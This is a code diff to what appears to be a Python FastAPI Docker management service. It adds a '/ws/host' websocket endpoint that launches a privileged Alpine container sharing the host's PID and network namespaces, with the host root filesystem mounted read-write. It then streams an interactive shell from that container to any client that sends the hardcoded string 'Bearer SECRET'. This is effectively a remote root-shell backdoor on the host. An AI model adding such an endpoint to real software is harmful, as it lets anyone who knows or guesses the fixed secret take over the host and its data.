@@ -553,6 +553,90 @@ async def stream_logs(container_id: str, request: Request):
         }
     )
 
+def get_or_create_host_container():
+    name = "host-shell"
+
+    try:
+        container = client.containers.get(name)
+        if container.status != "running":
+            container.start()
+        return container
+    except docker.errors.NotFound:
+        return client.containers.run(
+            "alpine",
+            name=name,
+            command="/bin/sh",
+            stdin_open=True,
+            tty=True,
+            detach=True,
+            privileged=True,
+            pid_mode="host",
+            network_mode="host",
+            volumes={"/": {"bind": "/host", "mode": "rw"}},
+        )
+
+@app.websocket("/ws/host")
+async def websocket_host(websocket: WebSocket):
+    token = websocket.query_params.get("token")
+    
+    await websocket.accept()
+
+    auth = await websocket.receive_text()
+
+    if auth != "Bearer SECRET":
+        await websocket.close(code=1008)
+        return
+
+    try:
+        container = get_or_create_host_container()
+
+        exec_id = client.api.exec_create(
+            container.id,
+            cmd="/bin/sh",
+            stdin=True,
+            tty=True,
+        )["Id"]
+
+        sock = client.api.exec_start(exec_id, socket=True, tty=True)
+
+        raw_sock = sock._sock if hasattr(sock, "_sock") else sock
+        raw_sock.setblocking(False)
+
+    except Exception as e:
+        await websocket.close(code=1011, reason=str(e))
+        return
+
+    loop = asyncio.get_event_loop()
+    running = True
+
+    async def read_from_docker():
+        nonlocal running
+        while running:
+            try:
+                data = await loop.run_in_executor(None, raw_sock.recv, 4096)
+                if not data:
+                    break
+                await websocket.send_bytes(data)
+            except BlockingIOError:
+                await asyncio.sleep(0.01)
+            except Exception:
+                break
+        running = False
+
+    async def write_to_docker():
+        nonlocal running
+        try:
+            while running:
+                data = await websocket.receive_text()
+                await loop.run_in_executor(None, raw_sock.send, data.encode())
+        except WebSocketDisconnect:
+            running = False
+        finally:
+            raw_sock.close()
+
+    await asyncio.gather(read_from_docker(), write_to_docker())
+
+
 @app.websocket("/ws/attach/{container_id}")
 async def websocket_attach(websocket: WebSocket, container_id: str):
     await websocket.accept()
